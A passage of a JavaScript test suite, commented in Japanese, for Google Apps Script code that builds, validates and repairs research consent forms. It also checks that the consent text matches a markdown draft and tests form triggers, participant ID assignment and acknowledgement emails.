  } catch (e) {
    return ["THREW: " + String(e && e.message ? e.message : e)];
  }
};

{
  const ctx = brokenConsentCtx(3);
  const form = ctx.__forms[O1_C];
  push(
    "§19 前提: 壊した形は参加者ID で終わる（実物と同じ）",
    titlesOf(form)[form.__items.length - 1] === ctx.Q_O1_PID,
    { last: titlesOf(form).slice(-1) }
  );
  const before = titlesOf(form).slice();
  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
  const after = titlesOf(form);
  push(
    "§19 修復は お名前・メールアドレス・パソコンの種類 をこの順で末尾に足す",
    !r.threw &&
      r.value === 3 &&
      JSON.stringify(after) === JSON.stringify(before.concat([ctx.Q_O1_NAME, ctx.Q_O1_EMAIL, ctx.Q_O1_OS])),
    { threw: r.threw, message: r.message, value: r.value, tail: after.slice(-4) }
  );
  push("§19 修復は設問を消さない（回答があるフォーム）", form.__deleted === 0, { deleted: form.__deleted });
  const byTitle = (t) => form.__items.find((i) => i.__title === t) || {};
  push(
    "§19 足した設問は構築と同じ定義（必須・メールの検査・OS の 3 択）",
    byTitle(ctx.Q_O1_NAME).__required === true &&
      byTitle(ctx.Q_O1_NAME).__type === "TEXT" &&
      byTitle(ctx.Q_O1_EMAIL).__required === true &&
      (byTitle(ctx.Q_O1_EMAIL).__validation || {}).__pattern === ".+@.+" &&
      byTitle(ctx.Q_O1_OS).__type === "MULTIPLE_CHOICE" &&
      byTitle(ctx.Q_O1_OS).__required === true &&
      JSON.stringify(byTitle(ctx.Q_O1_OS).__choices) === JSON.stringify(["Windows", "Mac", "両方使う"]),
    {}
  );
  const pairs = {};
  pairs[ctx.Q_O1_PID] = "";
  pairs[ctx.Q_O1_NAME] = "山田";
  pairs[ctx.Q_O1_EMAIL] = "y@example.com";
  pairs[ctx.Q_O1_OS] = "Windows";
  const titlesNow = titlesOf(form);
  const usable = {};
  Object.keys(pairs).forEach((t) => {
    if (titlesNow.indexOf(t) >= 0) usable[t] = pairs[t];
  });
  const a = ctx.o1ConsentAnswers_(makeResponse(usable).response);
  push(
    "§19 修復した後のフォームから回答取得が name・email・os を取れる（往復）",
    a.name === "山田" && a.email === "y@example.com" && a.os === "Windows",
    a
  );
  push(
    "§19 修復した後の照合は問題 0",
    shapeProblems(ctx, form).length === 0,
    { problems: shapeProblems(ctx, form) }
  );
  const again = attempt(() => ctx.repairO1ConsentRegistrationItems());
  push("§19 2 回目の修復は何も足さない（冪等）", !again.threw && again.value === 0, again);
}

{
  // 4 つとも欠けた形（最後の同意項目と見出しで終わる）でも、正しい順で戻せる。
  const ctx = brokenConsentCtx(4);
  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
  push(
    "§19 4 つとも欠けていれば 参加者ID から順に 4 つ足す",
    !r.threw &&
      r.value === 4 &&
      JSON.stringify(titlesOf(ctx.__forms[O1_C]).slice(-4)) ===
        JSON.stringify([ctx.Q_O1_PID, ctx.Q_O1_NAME, ctx.Q_O1_EMAIL, ctx.Q_O1_OS]),
    { threw: r.threw, message: r.message, value: r.value }
  );
}

{
  // 並びが崩れた形（参加者ID が無く、お名前以降はある）では、末尾に足すと順序が壊れるので止まる。
  const ctx = makeReadyCtx();
  ctx.buildO1ConsentForm();
  const form = ctx.__forms[O1_C];
  form.__responses = 1;
  form.__items = form.__items.filter((i) => i.__title !== ctx.Q_O1_PID);
  const n = form.__items.length;
  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
  push(
    "§19 欠けが後ろ側にまとまっていなければ足さずに止まる",
    r.threw && form.__items.length === n,
    { threw: r.threw, message: r.message, items: form.__items.length }
  );
}

{
  // メールアドレスだけが欠け、パソコンの種類が お名前 より前にある。最後の設問は お名前 なので
  // 最後の設問の検査は通る。欠けが後ろ側にまとまっているかの検査だけが止める形。
  const ctx = makeReadyCtx();
  ctx.buildO1ConsentForm();
  const form = ctx.__forms[O1_C];
  form.__responses = 1;
  const name = form.__items.find((i) => i.__title === ctx.Q_O1_NAME);
  const os = form.__items.find((i) => i.__title === ctx.Q_O1_OS);
  form.__items = form.__items
    .filter((i) => i !== name && i !== os && i.__title !== ctx.Q_O1_EMAIL)
    .concat([os, name]);
  const n = form.__items.length;
  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
  push(
    "§19 最後の設問が合っていても、並びが崩れていれば止まる",
    r.threw && form.__items.length === n,
    { threw: r.threw, message: r.message }
  );
}

{
  // 登録用の設問の後ろに見出しが付いている。照合は見出しを見ないので、最後の設問の検査だけが止める形。
  const ctx = brokenConsentCtx(3);
  const form = ctx.__forms[O1_C];
  form.addSectionHeaderItem().setTitle("後から付いた見出し");
  push("§19 前提: この形は照合では問題 0", shapeProblems(ctx, form).filter((p) => p.indexOf("欠けている") < 0).length === 0, {
    problems: shapeProblems(ctx, form),
  });
  const n = form.__items.length;
  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
  push(
    "§19 登録用の設問の後ろに見出しがあれば足さずに止まる",
    r.threw && form.__items.length === n,
    { threw: r.threw, message: r.message }
  );
}

{
  // 登録用の設問の後ろに別の設問がある（migrate で同意項目が末尾に付いた等）なら止まる。
  const ctx = brokenConsentCtx(3);
  const form = ctx.__forms[O1_C];
  form.addCheckboxItem().setTitle("後から付いた同意項目");
  const n = form.__items.length;
  const r = attempt(() => ctx.repairO1ConsentRegistrationItems());
  push(
    "§19 最後の設問が登録用でなければ足さずに止まる",
    r.threw && form.__items.length === n,
    { threw: r.threw, message: r.message }
  );
}

{
  // 照合（読み取り専用）
  const ok = makeReadyCtx();
  ok.buildO1ConsentForm();
  const okForm = ok.__forms[O1_C];
  const p0 = attempt(() => ok.o1ConsentFormShapeProblems_(okForm));
  push("§19 構築直後の照合は問題 0（陽性対照）", !p0.threw && p0.value.length === 0, p0);

  const ctx = brokenConsentCtx(3);
  const form = ctx.__forms[O1_C];
  const snap = JSON.stringify(form.__items.map((i) => [i.__type, i.__title, i.__required]));
  const res = attempt(() => ctx.checkO1ConsentFormShape());
  push(
    "§19 欠けたフォームで照合は false を返し、欠けた 3 つを名指しする",
    !res.threw &&
      res.value === false &&
      [ctx.Q_O1_NAME, ctx.Q_O1_EMAIL, ctx.Q_O1_OS].every((t) => ctx.__logs.join("\n").indexOf(t) >= 0),
    { threw: res.threw, message: res.message, value: res.value, logs: ctx.__logs.slice(0, 6) }
  );
  push(
    "§19 照合はフォームを変更しない",
    JSON.stringify(form.__items.map((i) => [i.__type, i.__title, i.__required])) === snap && form.__deleted === 0,
    {}
  );
  const okRes = attempt(() => ok.checkO1ConsentFormShape());
  push("§19 正しいフォームで照合は true を返す", !okRes.threw && okRes.value === true, okRes);
}

{
  // 種類違い・必須の違い・順序違いも挙げる。
  const mk = () => {
    const c = makeReadyCtx();
    c.buildO1ConsentForm();
    return c;
  };
  const c1 = mk();
  c1.__forms[O1_C].__items.find((i) => i.__title === c1.Q_O1_EMAIL).__required = false;
  push(
    "§19 照合: メールアドレスが必須でなければ挙げる",
    shapeProblems(c1, c1.__forms[O1_C]).some((p) => p.indexOf(c1.Q_O1_EMAIL) >= 0),
    { problems: shapeProblems(c1, c1.__forms[O1_C]) }
  );
  const c2 = mk();
  const f2 = c2.__forms[O1_C];
  const iName = f2.__items.findIndex((i) => i.__title === c2.Q_O1_NAME);
  const iMail = f2.__items.findIndex((i) => i.__title === c2.Q_O1_EMAIL);
  const tmp = f2.__items[iName];
  f2.__items[iName] = f2.__items[iMail];
  f2.__items[iMail] = tmp;
  push(
    "§19 照合: お名前とメールアドレスの順序が逆なら挙げる",
    shapeProblems(c2, f2).length > 0,
    { problems: shapeProblems(c2, f2) }
  );
  const c3 = mk();
  const f3 = c3.__forms[O1_C];
  const firstCheck = f3.__items.find((i) => i.__type === "CHECKBOX");
  f3.__items = f3.__items.filter((i) => i !== firstCheck);
  push(
    "§19 照合: 同意項目が 1 つ欠けても挙げる",
    shapeProblems(c3, f3).some((p) => p.indexOf(firstCheck.__title) >= 0),
    { problems: shapeProblems(c3, f3) }
  );
  const c4 = mk();
  const f4 = c4.__forms[O1_C];
  const osIdx = f4.__items.findIndex((i) => i.__title === c4.Q_O1_OS);
  const fake = makeItem("TEXT");
  fake.__title = c4.Q_O1_OS;
  fake.__required = true;
  f4.__items[osIdx] = fake;
  push(
    "§19 照合: パソコンの種類が選択式でなければ挙げる",
    shapeProblems(c4, f4).some((p) => p.indexOf(c4.Q_O1_OS) >= 0),
    { problems: shapeProblems(c4, f4) }
  );
}

{
  // code-reviewer LOW（2026-10-08）: 選択肢・重複・既存の並びの崩れ
  const mk = () => {
    const c = makeReadyCtx();
    c.buildO1ConsentForm();
    return c;
  };
  const c1 = mk();
  c1.__forms[O1_C].__items.find((i) => i.__title === c1.Q_O1_OS).__choices = ["Windows", "macOS", "両方使う"];
  push(
    "§19 照合: パソコンの種類の選択肢が違えば挙げる",
    shapeProblems(c1, c1.__forms[O1_C]).some((p) => p.indexOf("選択肢") >= 0),
    { problems: shapeProblems(c1, c1.__forms[O1_C]) }
  );
  const c2 = mk();
  const f2 = c2.__forms[O1_C];
  const dup = makeItem("TEXT");
  dup.__title = c2.Q_O1_NAME;
  dup.__required = true;
  f2.__items.push(dup);
  push(
    "§19 照合: 同じタイトルの設問が 2 つあれば挙げる",
    shapeProblems(c2, f2).some((p) => p.indexOf("2 つ以上") >= 0 && p.indexOf(c2.Q_O1_NAME) >= 0),
    { problems: shapeProblems(c2, f2) }
  );
  // [..., 参加者ID, 同意X(後から付いた), お名前, メールアドレス] は最後の設問と後ろ側の検査を通るが、
  // 足しても一致しない。足す前に止まる。
  const c3 = mk();
  const f3 = c3.__forms[O1_C];
  f3.__responses = 1;
  const pidIdx = f3.__items.findIndex((i) => i.__title === c3.Q_O1_PID);
  const stray = makeItem("CHECKBOX");
  stray.__title = "後から付いた同意項目";
  stray.__required = true;
  f3.__items.splice(pidIdx + 1, 0, stray);
  f3.__items = f3.__items.filter((i) => i.__title !== c3.Q_O1_OS);
  const n3 = f3.__items.length;
  const r3 = attempt(() => c3.repairO1ConsentRegistrationItems());
  push(
    "§19 修復: 欠け以外の問題が足す前からあれば足さずに止まる",
    r3.threw && f3.__items.length === n3 && (r3.message || "").indexOf("後から付いた同意項目") >= 0,
    { threw: r3.threw, message: r3.message }
  );
}

{
  // cross-review（Codex・2026-10-08）: プロトタイプのキー名のタイトルと、登録用と同名の見出し
  const c1 = makeReadyCtx();
  c1.buildO1ConsentForm();
  const f1 = c1.__forms[O1_C];
  const odd = makeItem("TEXT");
  odd.__title = "constructor";
  f1.__items.push(odd);
  push(
    "§19 照合: タイトルが constructor の設問も「コードに無い設問」として挙げる",
    shapeProblems(c1, f1).some((p) => p.indexOf("コードに無い設問: constructor") >= 0),
    { problems: shapeProblems(c1, f1) }
  );
  // …参加者ID → パソコンの種類 → 見出し「参加者ID…」で、お名前とメールアドレスが欠けている形
  const c2 = makeReadyCtx();
  c2.buildO1ConsentForm();
  const f2 = c2.__forms[O1_C];
  f2.__responses = 1;
  f2.__items = f2.__items.filter((i) => i.__title !== c2.Q_O1_NAME && i.__title !== c2.Q_O1_EMAIL);
  f2.addSectionHeaderItem().setTitle(c2.Q_O1_PID);
  const n2 = f2.__items.length;
  const r2 = attempt(() => c2.repairO1ConsentRegistrationItems());
  push(
    "§19 修復: 最後が登録用と同名の見出しなら足さずに止まる",
    r2.threw && f2.__items.length === n2,
    { threw: r2.threw, message: r2.message }
  );
}

{
  // 10/03 の誤報の回帰: 同意項目が揃っていても、登録用が欠けていれば「一致しています」と言わない。
  const ctx = brokenConsentCtx(3);
  const r = attempt(() => ctx.migrateO1ConsentForm());
  const log = ctx.__logs.join("\n");
  push(
    "§19 migrate は登録用が欠けたフォームで「一致しています」と言わず、欠けを出す",
    !r.threw && r.value === 0 && log.indexOf("一致しています") < 0 && log.indexOf(ctx.Q_O1_EMAIL) >= 0,
    { threw: r.threw, message: r.message, logs: ctx.__logs }
  );
  const ok = makeReadyCtx();
  ok.buildO1ConsentForm();
  ok.__forms[O1_C].__responses = 1;
  ok.__logs.length = 0;
  ok.migrateO1ConsentForm();
  push(
    "§19 migrate は正しいフォームでは一致と言う（陽性対照）",
    ok.__logs.join("\n").indexOf("一致しています") >= 0,
    { logs: ok.__logs }
  );
}

// ============================================================
// §20 段 1 の同意フォーム（S1-C・判断 1・18）
// ============================================================
// 同意の項目が md と 1 対 1・同じ文であること、O1 と G1 のフォームを消さないこと、
// 段 1 の提出が段 1 の受付メールと種別で記録されること、O1 のトリガに触らないこと。
const S1_CONSENT_DOC = path.join(REPO, ".steering/20261114-gse-stage1-n3-consent/consent-draft-s1.md");
const S1_C = "S1FORMCONSENT";
const S1_URL = "https://drive.example/s1";

/** md の「同意の項目」の番号つきの行を順に返す。 */
function s1DocItems() {
  const doc = fs.readFileSync(S1_CONSENT_DOC, "utf8");
  const start = doc.indexOf("## 同意の項目");
  const end = doc.indexOf("\n---", start);
  if (start < 0 || end < 0) return [];
  return doc
    .slice(start, end)
    .split("\n")
    .map((l) => l.match(/^(\d+)\. (.*)$/))
    .filter(Boolean)
    .map((m) => m[2]);
}

/** O1 の準備に段 1 のフォームとプロパティを足した文脈。 */
function makeS1Ctx(extra) {
  const o = extra || {};
  const ctx = makeReadyCtx(o);
  ctx.__forms[S1_C] = makeForm(S1_C, { responses: o.s1Responses || 0 });
  ctx.__props.FORM_ID_S1_CONSENT = o.s1FormId === undefined ? S1_C : o.s1FormId;
  ctx.__props.S1_APP_DOWNLOAD_URL = o.s1Url === undefined ? S1_URL : o.s1Url;
  return ctx;
}

/** フォームの本文（説明と見出しの本文）を 1 つの文字列にする。 */
function s1FormText(form) {
  return [form.__title, form.__description]
    .concat(form.__items.map((i) => i.__title + "\n" + i.__help))
    .join("\n");
}

{
  const ctx = makeS1Ctx();
  const items = ctx.s1ConsentItemTitles_();
  const doc = s1DocItems();
  push("§20 md の同意の項目を読めた（15 件）", doc.length === 15, { n: doc.length });
  push("§20 同意の項目の数が md と同じ", items.length === doc.length, { form: items.length, md: doc.length });
  const diff = items.map((t, i) => (t === doc[i] ? null : { i: i + 1, form: t, md: doc[i] })).filter(Boolean);
  push("§20 同意の項目が md と 1 対 1 で同じ文", diff.length === 0 && items.length === doc.length, { diff });
}

{
  // 構築の陽性対照: 項目が順に並び、全部必須で、登録の設問が末尾に並ぶ。
  const ctx = makeS1Ctx();
  const r = attempt(() => ctx.buildS1ConsentForm());
  const form = ctx.__forms[S1_C];
  const boxes = form.__items.filter((i) => i.__type === "CHECKBOX");
  push("§20 陽性対照: 設定が揃えば構築できる", !r.threw, r);
  push(
    "§20 チェックの項目が同意の項目と同じ順・全部必須",
    boxes.length === 15 &&
      boxes.every((b, i) => b.__title === ctx.s1ConsentItemTitles_()[i] && b.__required),
    { n: boxes.length }
  );
  const tail = form.__items.slice(-4).map((i) => i.__title);
  push("§20 登録の設問が末尾に O1 と同じ順で並ぶ", JSON.stringify(tail) === JSON.stringify(ctx.O1_REGISTRATION_TITLES), { tail });
  push("§20 O1 のフォームには触れない", ctx.__forms[O1_C].__items.length === 0 && ctx.__forms[O1_C].__deleted === 0, {});
  push("§20 フォームの URL を S1_CONSENT として残す", !!ctx.__props.FORMURL_S1_CONSENT, {});
}

{
  // 本文の約束が md とフォームの両方にある。
  const ctx = makeS1Ctx();
  ctx.buildS1ConsentForm();
  const text = s1FormText(ctx.__forms[S1_C]);
  const doc = fs.readFileSync(S1_CONSENT_DOC, "utf8");
  [
    "倫理審査委員会の審査を受けていません",
    "多くても 9 回",
    "20 分のあいだでは、多くても 3 回です",
    "長くても 8 週間",
    "謝礼はありません",
    "熟考",
    "回答不能",
    // ADR-055: 3 名の版の Q3 は 7 択。「作業」と重なりの規則が md とフォームの両方にある。
    "手を動かしていた（進んだかは問わない。入力・編集・単純作業を含む）",
    "いちばん長かったもの",
    "同時にしていたときは、詰まっていたなら詰まり、そうでなく手が動いていたなら作業",
    "7 つのうちどれを選んだか",
    // ADR-057: 1 つずつ・ボタンかキーで答える・Q1・Q2 は詰まり・熟考・作業のときだけ・キーはカードを出してから 2 分だけ（判断 8）。
    "問いは 1 つずつ出ます",
    "「詰まり」「熟考」「作業」を選んだときだけ、続けて次の 2 つを尋ねます",
    "「作業」を選んだときは、前に進んでいる感覚を先に尋ねます",
    "カードが出てから 2 分のあいだだけ、⌥（Windows では Ctrl と Alt）と数字 0〜7 の組をこのアプリが受け取ります",
    "押すと答えになります。2 分を過ぎるか、カードが消えると元に戻ります",
    "キーで答えても、作業中の文書に文字は入りません",
    "どの数字かは残りません",
    "ボタンの表示だけになります",
    "目盛りの値（尋ねたときだけ）",
    "1 つ目に答えたあとで閉じたときは、そこまでのお答えが残ります",
    "「会話」をお選びになると",
    "今日の作業にどのくらい熱意を持てましたか",
    "後半の初日は、必ず表示が出ます",
    "ほかの窓をどけた回数",
    "「問いへの同意を取り消す」を押すと",
    "無作為の表での割り当て）、記録のファイルごとの始まりの印と設定",
    "直前の時間帯を消すときは、一時停止せずに",
    "取り消した時刻より後の記録を削除し",
    "あなたの分の数値と図をお見せします",
    "1 つの日について尋ねるのは 2 回までです",
    "「問いに同意する」を押すまで、問いは出ません",
    "同意したことの記録）と、削除したことの記録は残ります",
    "ほかの研究には使いません",
    "誰の結果か分かるおそれがあるときは示しません",
    "記録そのもの（加工したものを含む）は公開しません",
    "研究者とのお付き合いには影響しません",
    "48 時間",
    ctx.O1_CONTACT_EMAIL,
    ctx.O1_CONTACT_NAME,
    ctx.O1_AFFILIATION,
  ].forEach((s) => {
    push(`§20 「${s}」が md とフォームの両方にある`, doc.indexOf(s) >= 0 && text.indexOf(s) >= 0, {
      md: doc.indexOf(s) >= 0,
      form: text.indexOf(s) >= 0,
    });
  });
  push(
    "§20 日の終わりの問いに手跡の日の項目を足すとは書かない（判断 17）",
    text.indexOf("項目が 1 つ足される") < 0 && doc.indexOf("項目が 1 つ足される") < 0,
    {}
  );
}

{
  // 問いの上限の数がアプリの調停器と一致する（配る前の条件 9）。
  const arb = fs.readFileSync(path.join(REPO, "src-tauri/src/analysis/probe_arbiter.rs"), "utf8");
  const m = arb.match(/pub const S1_MAX_PROBES_PER_HOUR: u64 = (\d+);/);
  const ctx = makeS1Ctx();
  push(
    "§20 1 時間の上限が probe_arbiter.rs の S1_MAX_PROBES_PER_HOUR と一致する",
    !!m && Number(m[1]) === ctx.S1_MAX_PROBES_PER_HOUR,
    { rs: m && m[1], gs: ctx.S1_MAX_PROBES_PER_HOUR }
  );
}

{
  // 守り: G1・O1 の ID、空の ID、回答のあるフォーム。
  [
    ["G1-C", G1_CONSENT_ID],
    ["O1-C", O1_C],
    ["O1-S", O1_S],
    ["空", ""],
  ].forEach(([label, id]) => {
    const ctx = makeS1Ctx({ s1FormId: id });
    if (id === G1_CONSENT_ID) ctx.__forms[id] = makeForm(id);
    const r = attempt(() => ctx.buildS1ConsentForm());
    push(`§20 ${label} の ID では構築しない（開かない）`, r.threw && ctx.__openedFormIds.indexOf(id) < 0, {
      threw: r.threw,
      opened: ctx.__openedFormIds,
    });
  });
  const ctx = makeS1Ctx();
  const r = attempt(() => ctx.s1OpenFixed_(O1_C));
  push("§20 s1OpenFixed_ も O1 の ID を開かない", r.threw && ctx.__openedFormIds.indexOf(O1_C) < 0, r);
  const flag = makeS1Ctx({ s1Responses: 1 });
  flag.O1_ALLOW_REBUILD_WITH_RESPONSES = true;
  const rf = attempt(() => flag.buildS1ConsentForm());
  push("§20 O1 の作り直しのフラグが立っていても回答のある段 1 のフォームは作り直さない", rf.threw && flag.__forms[S1_C].__deleted === 0, rf);
  // 逆向き: O1 の構築とトリガは段 1 のフォームに触れない。
  const rev = makeS1Ctx();
  rev.__props.FORM_ID_O1_CONSENT = S1_C;
  push(
    "§20 FORM_ID_O1_CONSENT が段 1 のフォームなら O1 の設定の問いになる",
    rev.o1ConfigProblems_().some((p) => p.indexOf("FORM_ID_S1_CONSENT") >= 0),
    { p: rev.o1ConfigProblems_() }
  );
  const rb2 = attempt(() => rev.buildO1ConsentForm());
  push("§20 O1 の構築は段 1 のフォームを開かない", rb2.threw && rev.__openedFormIds.indexOf(S1_C) < 0, rb2);
  const rev2 = makeS1Ctx();
  rev2.o1ConfigProblems_ = () => [];
  rev2.__props.FORM_ID_O1_CONSENT = S1_C;
  const rt = attempt(() => rev2.installO1ConsentTrigger());
  push("§20 O1 のトリガは段 1 のフォームに張らない（設定の検査を外しても）", rt.threw && rev2.__triggers.length === 0, rt);
  const np = makeS1Ctx();
  const rn = attempt(() => np.o1FinishO1Registration_({ email: "a@example.com", os: "Mac" }, "P001", "https://x", { reason: "new-pid", note: "" }));
  push("§20 登録の型を渡し忘れたら O1 に倒さず止まる", rn.threw && np.__mails.length === 0, rn);
  const withResp = makeS1Ctx({ s1Responses: 2 });
  const rr = attempt(() => withResp.buildS1ConsentForm());
  push("§20 回答のある段 1 のフォームは作り直さない", rr.threw && withResp.__forms[S1_C].__deleted === 0, rr);
}

{
  // 設定: アプリの URL。
  const same = makeS1Ctx({ s1Url: "https://drive.example/o1" });
  push(
    "§20 段 1 の URL が O1 と同じなら設定の問いになる",
    same.s1ConfigProblems_().some((p) => p.indexOf("O1_APP_DOWNLOAD_URL と同じ") >= 0),
    { p: same.s1ConfigProblems_() }
  );
  const empty = makeS1Ctx({ s1Url: "" });
  push("§20 段 1 の URL が空なら設定の問いになる", empty.s1ConfigProblems_().length > 0, {});
  const bad = makeS1Ctx({ s1Url: "folder-id-only" });
  push("§20 段 1 の URL が https でなければ設定の問いになる", bad.s1ConfigProblems_().length > 0, {});
  const ok = makeS1Ctx();
  push("§20 陽性対照: 揃っていれば問いは 0 件", ok.s1ConfigProblems_().length === 0, { p: ok.s1ConfigProblems_() });
  const o1id = makeS1Ctx({ s1FormId: O1_C });
  push(
    "§20 段 1 のフォームが O1 と同じ ID なら設定の問いになる",
    o1id.s1ConfigProblems_().some((p) => p.indexOf("O1 のフォームと同じ ID") >= 0),
    { p: o1id.s1ConfigProblems_() }
  );
  const noUrl = makeS1Ctx({ s1Url: "" });
  const rb = attempt(() => noUrl.buildS1ConsentForm());
  push(
    "§20 アプリの URL が欠けていれば構築せず、フォームを開かない",
    rb.threw && noUrl.__openedFormIds.length === 0 && noUrl.__forms[S1_C].__items.length === 0,
    { threw: rb.threw, opened: noUrl.__openedFormIds }
  );
  [
    "https://drive.example/o1?usp=sharing",
    "https://drive.example/o1/",
    "HTTPS://DRIVE.EXAMPLE/o1#x",
  ].forEach((u) => {
    const c = makeS1Ctx({ s1Url: u });
    push(`§20 O1 と同じ URL の書き換え（${u}）も設定の問いになる`, c.s1ConfigProblems_().length > 0, {});
  });
  const drive = makeS1Ctx({ s1Url: "https://drive.google.com/drive/u/0/folders/ABC_123?usp=sharing" });
  drive.__props.O1_APP_DOWNLOAD_URL = "https://drive.google.com/drive/folders/ABC_123";
  push("§20 Drive の同じフォルダ ID なら設定の問いになる", drive.s1ConfigProblems_().length > 0, {});
  const other = makeS1Ctx({ s1Url: "https://drive.google.com/drive/folders/S1_FOLDER" });
  other.__props.O1_APP_DOWNLOAD_URL = "https://drive.google.com/drive/folders/O1_FOLDER";
  const hosts = makeS1Ctx({ s1Url: "https://b.example/get?id=SAME" });
  hosts.__props.O1_APP_DOWNLOAD_URL = "https://a.example/get?id=SAME";
  push("§20 陽性対照: Drive でない別のホストは同じ id でも別の配布先", hosts.s1ConfigProblems_().length === 0, {
    p: hosts.s1ConfigProblems_(),
  });
  push("§20 陽性対照: 違う Drive のフォルダなら問いは 0 件", other.s1ConfigProblems_().length === 0, {
    p: other.s1ConfigProblems_(),
  });
  const r = attempt(() => same.s1RegisterAckBody_("P001"));
  push("§20 受付メールの本文も O1 と同じ URL なら作らない（最後の砦）", r.threw, r);
}

{
  // トリガ: 段 1 の付け外しは O1 のトリガに触らない。
  const ctx = makeS1Ctx();
  ctx.buildS1ConsentForm();
  ctx.__triggers.push({ getHandlerFunction: () => "onO1ConsentSubmit" });
  const r = attempt(() => ctx.installS1ConsentTrigger());
  const fns = ctx.__triggers.map((t) => t.getHandlerFunction());
  push(
    "§20 段 1 のトリガを張っても O1 のトリガは残る",
    !r.threw && fns.indexOf("onO1ConsentSubmit") >= 0 && fns.indexOf("onS1ConsentSubmit") >= 0,
    { fns, r }
  );
  ctx.installS1ConsentTrigger();
  const fns2 = ctx.__triggers.map((t) => t.getHandlerFunction());
  push(
    "§20 張り直しても段 1 のトリガは 1 本・O1 は残る",
    fns2.filter((f) => f === "onS1ConsentSubmit").length === 1 && fns2.indexOf("onO1ConsentSubmit") >= 0,
    { fns2 }
  );
  const bad = makeS1Ctx({ s1Url: "" });
  bad.__triggers.push({ getHandlerFunction: () => "onS1ConsentSubmit" });
  const rb = attempt(() => bad.installS1ConsentTrigger());
  push(
    "§20 設定が欠けていればトリガを張らず、既存の段 1 のトリガも消さない",
    rb.threw && bad.__triggers.length === 1,
    { n: bad.__triggers.length }
  );
  const chg = makeS1Ctx();
  chg.buildS1ConsentForm();
  chg.__forms[S1_C].__items.filter((i) => i.__type === "CHECKBOX")[3].__choices = ["はい"];
  const rc = attempt(() => chg.installS1ConsentTrigger());
  push("§20 同意の選択肢が書き換わったフォームにはトリガを張らない", rc.threw && chg.__triggers.length === 0, rc);
  const failCreate = makeS1Ctx();
  failCreate.buildS1ConsentForm();
  failCreate.__triggers.push({ getHandlerFunction: () => "onS1ConsentSubmit" });
  failCreate.ScriptApp.newTrigger = () => ({ forForm: () => ({ onFormSubmit: () => ({ create: () => { throw new Error("stub: create failed"); } }) }) });
  const rcf = attempt(() => failCreate.installS1ConsentTrigger());
  push("§20 トリガを作れなかったときは既存の段 1 のトリガを残す", rcf.threw && failCreate.__triggers.length === 1, {
    n: failCreate.__triggers.length,
  });
  const rm = makeS1Ctx();
  rm.__triggers.push({ getHandlerFunction: () => "onO1ConsentSubmit" });
  rm.__triggers.push({ getHandlerFunction: () => "onS1ConsentSubmit" });
  rm.removeS1ConsentTriggers();
  const rmf = rm.__triggers.map((t) => t.getHandlerFunction());
  push("§20 removeS1ConsentTriggers は段 1 のトリガだけを外す", JSON.stringify(rmf) === '["onO1ConsentSubmit"]', { rmf });
  // 未構築のフォーム・開けないフォームでは、既存の段 1 のトリガを消さずに止まる。
  const unbuilt = makeS1Ctx();
  unbuilt.__triggers.push({ getHandlerFunction: () => "onS1ConsentSubmit" });
  const ru = attempt(() => unbuilt.installS1ConsentTrigger());
  push("§20 未構築のフォームにはトリガを張らず、既存の段 1 のトリガも消さない", ru.threw && unbuilt.__triggers.length === 1, {
    n: unbuilt.__triggers.length,
  });
  const gone = makeS1Ctx();
  gone.buildS1ConsentForm();
  delete gone.__forms[S1_C];
  gone.__triggers.push({ getHandlerFunction: () => "onS1ConsentSubmit" });
  const rg = attempt(() => gone.installS1ConsentTrigger());
  push("§20 フォームを開けないときも既存の段 1 のトリガを消さない", rg.threw && gone.__triggers.length === 1, {
    n: gone.__triggers.length,
  });
  const o1 = makeS1Ctx();
  o1.__triggers.push({ getHandlerFunction: () => "onS1ConsentSubmit" });
  o1.removeO1ConsentTriggers();
  push("§20 O1 のトリガを外しても段 1 のトリガは残る", o1.__triggers.length === 1, {});
}

{
  // 提出: 新しい人は採番され、段 1 の受付メールが届き、種別 s1-register で記録される。
  const ctx = makeS1Ctx({ roster: [["P006", "既存", "old@example.com"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onS1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_PID]: "",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  const mail = ctx.__mails[0] || { subject: "", body: "" };
  push("§20 段 1 の提出で採番される", roster.__rows.length === 2 && roster.__rows[1][0] === "P007", {
    rows: roster.__rows,
  });
  push(
    "§20 段 1 の受付メール（件名・段 1 の URL・P-ID）が届き、O1 の URL は入らない",
    ctx.__mails.length === 1 &&
      mail.subject === ctx.s1RegisterAckSubject_() &&
      mail.body.indexOf(S1_URL) >= 0 &&
      mail.body.indexOf("https://drive.example/o1") < 0 &&
      mail.body.indexOf("P007") >= 0,
    { subject: mail.subject }
  );
  push(
    "§20 受付メールに段 1 の約束（答えなくてよい・やめる・取り消し）がある",
    ["答えなくてかまいません", "「やめる」", "「問いへの同意を取り消す」", "長くても 8 週間"].every(
      (s) => mail.body.indexOf(s) >= 0
    ),
    {}
  );
  const rows = logRows(ctx);
  push(
    "§20 登録ログの種別が s1-register",
    rows.length === 1 && rows[0][1] === "s1-register" && rows[0][3] === "ok",
    { rows }
  );
}

{
  // 提出: 段 1 の URL が O1 と同じなら P-ID を焼かずに止まる。
  const ctx = makeS1Ctx({ roster: [["P006", "既存", "old@example.com"]], s1Url: "https://drive.example/o1" });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onS1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_PID]: "",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  const rows = logRows(ctx, MGMT_REJECT_TAB);
  push(
    "§20 URL が O1 と同じなら採番も送信もせず、s1-register / config-error で却下ログへ",
    roster.__rows.length === 1 &&
      ctx.__mails.length === 0 &&
      rows.length === 1 &&
      rows[0][1] === "s1-register" &&
      rows[0][4] === "config-error",
    { rows, mails: ctx.__mails.length }
  );
}

{
  // O1 の提出は今までどおり種別 register と O1 の受付メール（陰性対照）。
  const ctx = makeS1Ctx({ roster: [["P006", "既存", "old@example.com"]] });
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
